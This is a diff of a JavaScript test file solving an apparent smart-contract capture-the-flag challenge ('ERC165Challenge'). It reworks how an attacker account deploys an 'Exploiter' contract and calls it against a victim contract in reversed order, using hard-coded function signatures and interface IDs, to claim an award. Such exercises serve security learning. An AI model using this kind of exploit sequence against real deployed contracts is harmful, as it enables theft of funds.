@@ -51,13 +51,14 @@ describe('ERC165Challenge', function () {
                 /* YOUR CODE HERE */
                 funcSig = ["0x5c0509f5","0x0b8287ee","0x48881449","0x444ce9de"];
                 ifceId = ["0x4e2312e0","0x88a7ca5c","0x13371337","0xdecafc0f"];
-    
+                let revOrder = this.order.reverse()
+
                 const ExploiterFactory = await ethers.getContractFactory('Exploiter');
-                const exploiter = await ExploiterFactory.connect(attacker).deploy();
-    
-                this.order.reverse().forEach(async (el,idx)=>{
+                let first = revOrder.shift()
+                const exploiter = await ExploiterFactory.connect(attacker).deploy(this.victim.address,funcSig[first-1],ifceId[first-1],this.award.address,false,{value: ethers.utils.parseEther("100","gwei")});
+                revOrder.forEach(async (el,idx)=>{
                     let callSuccess 
-                    idx == this.order.length - 1 ? callSuccess = true : callSuccess = false;
+                    idx == revOrder.length - 1 ? callSuccess = true : callSuccess = false;
                     await exploiter.connect(attacker).execute(this.victim.address,funcSig[el-1],ifceId[el-1],this.award.address,callSuccess,{value: ethers.utils.parseEther("100","gwei")})
                 })
     
